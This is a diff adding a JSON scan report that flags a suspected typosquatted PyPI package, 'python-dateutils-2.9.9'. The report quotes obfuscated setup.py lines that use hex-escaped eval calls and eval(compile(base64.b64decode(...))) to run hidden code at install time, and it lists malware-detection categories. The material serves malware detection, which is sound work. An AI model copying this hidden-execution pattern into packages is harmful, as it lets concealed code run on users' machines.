@@ -1,0 +1,35 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "exec-base64": [
+            {
+                "location": "setup.py:8",
+                "code": "eval(compile(base64.b64decode(eval('\\x74\\x72\\x75\\x73\\x74')),'<string>','exec'))\n",
+                "message": "This package contains a call to the `eval` function with a `base64` encoded string as argument.\nThis is a common method used to hide a malicious payload in a module as static analysis will not decode the\nstring.\n"
+            }
+        ],
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:7",
+                "code": "trust = eval('\\x6d\\x61\\x67\\x69\\x63') + eval('\\x63\\x6f\\x64\\x65\\x63\\x73\\x2e\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x6c\\x6f\\x76\\x65\\x2c\\x20\\x6a\\x6f\\x79\\x29') + eval('\\x67\\x6f\\x64') + eval('\\x63\\x6f\\x64\\x65\\x63\\x73\\x2e\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x64\\x65\\...x79\\x29')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:8",
+                "code": "eval(compile(base64.b64decode(eval('\\x74\\x72\\x75\\x73\\x74')),'<string>','exec'))\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/python-dateutils-2.9.9"
+}
